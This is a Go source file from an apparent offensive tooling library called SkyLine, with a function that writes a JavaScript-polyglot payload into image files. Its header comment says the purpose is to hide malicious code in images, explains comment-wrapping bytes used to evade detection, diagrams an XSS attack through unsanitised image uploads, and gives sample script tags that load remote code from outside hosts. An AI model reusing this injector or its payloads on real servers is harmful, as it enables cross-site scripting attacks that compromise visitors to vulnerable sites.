package SkyLine_Standard_External_Forensics

import (
	"fmt"
	"os"
)

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// This path of (n) contains all digital forensics based functions for images, files, memory, binary files and much more among that list.
//
// n = StandardLibraryExternal/Forensics
//
// This type of module contains much more files and information for general digital forensics and steganography. This includes functions and
// types as well as parsers that can look up signatures in images, verify unifentified files, pull data from files and images, extract signatures
// and uses the syscall table to read and write data to images with an option that allows you to encrypt and then inject data into an image. Currently
// this library only works with mainly PNG images but also has support for JPG/JPEG images and as far as general injection goes it works with most images
// which are common that includes BMP, JPG, JPEG, PNG, GIF, WEBP, WebM and other various file formats.
//
//
// - Date of start : Wed 01 Mar 2023 02:18:32 PM EST
//
// - File name     : SkyLine_Image_Forensics_ControllInject.go
//
// - File contains : All controller functions for injection and writers that use standard parsing techniques. Functions within this code are used to parse and inject payloads
//					 Such as `<script src=//web.form.gov> </script>`
// 					 Techniques are explained below
//
//
// The purpose of this controller function is to hide remote and malicous code within an image but encode it to
// where it will execute when the data is parsed
//
// or ran through something such as a parser on the other end of something like a web server.
// The following example breaks down the hex code injected into the image
//
// as a set of bytes. There will also be a minimal graphic showing this example and writing it
// to code explaining each bit of it
//
//
// The follwoing false (psudeo) code describes the bytes like so
//
// CONST Start  = []byte{0x2f, 0x2a};
// CONST Middle = []byte{0x2a, 0x2f, 0x3d, 0x31, 0x3b};
// CONST End    = []byte{\x3b};
//
// These bytes define the mid point of the injection, the end of the injection and the start of the injection.
//
// Start                    	  ; \x2f and \x2a are representations for the START of a multi line comment
// Middle (first)                 ; \x2a and \x2f are representations for the END of a multi line comment
// Middle (Mid section / End)     ; \x3d and \x31 and \x3b represents a = to 1, this expression sets the variable = to 1.
// End                            ; THis represents the end of the injection
//
// PARSING AND UNDERSTANDING WHY THESE PARTS EXIST
//
//
// Start       : Start exists because hiding the code in a multi line comment from the start and the end will
//               allow offensive experts to bypass certain detection systems or
//               overwatch workers. Ofc this is still seeable but it makes it easier to hide than just plain out there
//
// Middle END  : This section exists because it allows the attacker to execute the code that comes after the comment
//
// END         : This will define the delimiter to indicate the end of the payload that has been injected into the file
//
//
// Techniques like this make it easy to take control of servers by exploiting XSS like the following way
//
// Situation : A server allows you to upload an image, the image is not sanitized and the web server does not
//             properly handle content types
//
//
//
// -----------------------------------------------
// |  Vulnerable server allows a user or host    |
// |  to upload an image that is not checked or  |
// |  sanitized before being uploaded to the     |
// |  server                                     |
// -----------------------------------------------
// 					|
// 					|
//                  |---------------------------------------------|
// 					| Attacker hides a script tag in the image    |
// 					| containing a website holding remote JS code |
//                  | like alert('xss')                           |
//                  |---------------------------------------------|
// 										|
// 										|
// 										|-----------------------------------------------|
// 										| The payload injected into the file looks like |
// 										| <sCrIpt src=//BLOGSITE.IO.com></ScRipT>       |
//                                      |-----------------------------------------------|
// 														_____|
// 														|
// 														|
// 														|
// 														|
// 														|
// 						-----------------------------------------------------------
// 						| When the user visits the page or endpoint which the     |
// 						| file with the payload was uploaded to, this code then   |
// 						| gets executed because the content types are not handled |
// 						| correctly within the server thus the code executes      |
// 						-----------------------------------------------------------
//
//
// This type of attack is easy to attack but also very hard to work with well manually on the spot anyway
//
// this is why I designed this language, to make concepts like this way easier than they were before.
//
//

var (
	START = []byte{
		0x2f, 0x2a,
	}

	MIDDLE = []byte{
		0x2a, 0x2f,
		0x3d, 0x31,
		0x3b,
	}

	END = []byte{
		0x3b,
	}
)

func InjectImage(filename string, payload string) bool {
	f, x := os.OpenFile(filename, os.O_WRONLY, 0644)
	if x != nil {
		PrepareErrorAndLog(
			x,
			fmt.Sprint(ERROR_CODE_FILE_NOT_FOUND),
			"OS ^Operations^ (Err when opening the file) \n ASSUME (File not found)",
			"SkyLine encountered an error when trying to open the file ( "+filename+" ) -> "+fmt.Sprint(x),
		)
		return false
	}
	defer f.Close()
	SkyLine_Image_Forensics_Controller_M2_F_S(f, 6, 0)
	SkyLine_Image_Forensics_Controller_M2_F_W(f, START)
	SkyLine_Image_Forensics_Controller_M2_F_S(f, 0, 2)
	SkyLine_Image_Forensics_Controller_M2_F_W(f, MIDDLE)
	pay := []byte(payload)
	SkyLine_Image_Forensics_Controller_M2_F_W(f, pay)
	SkyLine_Image_Forensics_Controller_M2_F_W(f, END)
	return true
}
